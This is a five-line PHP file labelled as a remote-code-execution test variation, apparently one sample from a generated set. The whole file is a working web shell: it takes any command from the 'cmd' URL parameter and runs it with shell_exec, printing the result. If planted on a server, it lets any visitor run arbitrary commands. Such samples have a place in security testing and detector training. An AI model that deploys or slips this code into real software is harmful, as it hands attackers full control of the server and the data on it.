<?php
// RCE test variation #321
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>